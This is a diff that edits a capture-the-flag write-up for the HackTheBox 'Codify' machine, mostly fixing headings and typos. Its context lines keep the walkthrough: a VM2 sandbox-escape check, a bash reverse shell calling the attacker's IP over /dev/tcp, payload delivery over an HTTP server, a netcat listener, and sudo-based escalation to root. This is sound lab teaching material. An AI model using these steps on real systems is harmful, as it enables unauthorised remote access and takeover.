@@ -14,7 +14,7 @@ Join and then create an `/etc/hosts` entry for the Codify box. Replace the IP ad
 echo "10.10.11.239 codify.htb" | sudo tee -a /etc/hosts
 ```
 
-### Initial NMAP Scan
+## Initial NMAP Scan
 
 Now, we perform an nmap scan to see which ports are open and what services are available.
 
@@ -38,15 +38,15 @@ PORT     STATE SERVICE VERSION
 Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-So, this is a Linux box running an Apache `http` server on port 80, a Node.js express framework on port 3000 and `ssh` port 22 is also open.
+So, this is a Linux box running an Apache `http` server on port 80, a Node.js express framework on port 3000, and `ssh` port 22 is also open.
 
-### Check the Application
+## Check the Application
 
 Let's go ahead and open the [codify.htb]() URL in the browser.  We see there's a **Editor** section that allows us to run JavaScript code in a sandbox environment. We also learn from the **About** page that the editor is using the open-source package **VM2** to provide the sand-boxing environment.
 
 A quick google search tells us that this package is now deprecated and may be vulnerable to command injection attacks through sandbox escaping.
 
-### Check Vulnerability
+## Check Vulnerability
 
 You can confirm that the application is indeed vulnerable to command injection by running the following JS code in the editor.
 
@@ -61,14 +61,14 @@ if (version < "3.9.17") {
 ```
 
 
-As you can see, that this application is vulnerable due to the VM2 package version being deprecated. You can get the exact version number by running -
+As you can see, this application is vulnerable due to the VM2 package version being deprecated. You can get the exact version number by running -
 
 ```js
 const version = require("vm2/package.json").version;
 console.log(version);
 ```
 
-### Exploit Codify Editor [HTB]
+## Exploit Codify Editor [HTB]
 
 We can now try to exploit this vulnerable editor. A few google searches led me to [this page on the VM2 GitHub repository](https://github.com/patriksimek/vm2/issues/533#issuecomment-1750654480)
 
@@ -91,7 +91,7 @@ vm.run(code);
 
 This should print `svc`, which is the user we are interacting as.
 
-### Privilege Escalation
+## Privilege Escalation
 
 Now that we can execute commands inside the box, we need to find a way to escalate our privileges. Let's run some basic OS commands to get an overview of the machine and its users.
 
@@ -162,9 +162,9 @@ uid=999(lxd) gid=100(users) groups=100(users)
 uid=9(news) gid=9(news) groups=9(news)
 ```
 
-This command shows that there's a user called `joshua` on this system. We can now try to escalate into his account from our `svc` account. However, before we do that, let's get a proper shell into the Codify box so that we don't have deal with putting commands in the JS editor manually.
+This command shows that there's a user called `joshua` on this system. We can now try to escalate into his account from our `svc` account. However, before we do that, let's get a proper shell into the Codify box so that we don't have to deal with putting commands in the JS editor manually.
 
-### Spawn Reverse Shell into Codify
+## Spawn Reverse Shell into Codify
 
 We can spawn a TCP reverse shell into the box by downloading the following shell script into Codify and executing it. Open a text editor and paste the following snippet and name the file as `shell.sh`
 
@@ -174,19 +174,19 @@ We can spawn a TCP reverse shell into the box by downloading the following shell
 bash -c 'bash -i >& /dev/tcp/10.10.14.151//1337 0>&1'
 ```
 
-Change the IP address to your own tun0 interface IP address. You can use the below command to retreive your attack box IP.
+Change the IP address to your own tun0 interface IP address. You can use the below command to retrieve your attack box IP.
 
 ```bash
 ip a | grep tun0
 ```
 
-Now, fire up a HTTP server on your attack box so that you can deliver this shell script into the target box(Codify). You can use the following python one-liner.
+Now, fire up an HTTP server on your attack box so that you can deliver this shell script into the target box(Codify). You can use the following Python one-liner.
 
 ```bash
 python3 -m http.server 9000
 ```
 
-You can now download the shell script from the target machine using curl. However, before we do that, let's create a netcat listener on another terminal so that we can interact with the shell.
+You can now download the shell script from the target machine using curl. However, before we do that, let's create a `netcat` listener on another terminal so that we can interact with the shell.
 
 ```bash
 nc -lvnp 1337
@@ -206,7 +206,7 @@ From inside the `netcat` terminal running the reverse shell -
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 ```
 
-Hit enter and when it runx, press `Ctrl+Z`
+Hit enter and when it runs, press `Ctrl+Z`
 
 ```bash
 ^Z
@@ -220,7 +220,7 @@ stty raw -echo && fg
 
 This should bring up a nice color-highlighted terminal in your Codify machine through the `netcat` listener.
 
-### User Escalation in Codify HTB Box
+## User Escalation in Codify HTB Box
 
 By playing arounf the directories in the Codify box from our `svc` user, we find several interesting directories. One of the most promising option is the `/var/www` directory.
 
@@ -281,7 +281,7 @@ cat user.txt
 
 Voila! there you have the user flag.
 
-### Gain Root Access to Codify HTB
+## Gain Root Access to Codify HTB
 
 Gaining root access to this box wasn't so tricky for me. I simply ran `sudo -l` to see what commands I can run as root. It turns out there's a shell script in `/opt/scripts` directory called `mysql-backup.sh`.
 
@@ -309,7 +309,7 @@ cat root.txt
 
 And you finally get the root flag.
 
-## My thoughts
+# My thoughts
 
 Codify is definitely pwned. But I have reasons to believe this box can be pwned in a number of other ways. For example, we could have ssh'd into the Codify HTB box for initial access by constructing a payload that delivers the public IP of our attack box to the `~/.ssh/authorized_keys` directory of Codify - using the Editor tool. I also had some interesting ideas that involved Kernel CVE's and exploiting flaws in the Apache `httpd` server.
 
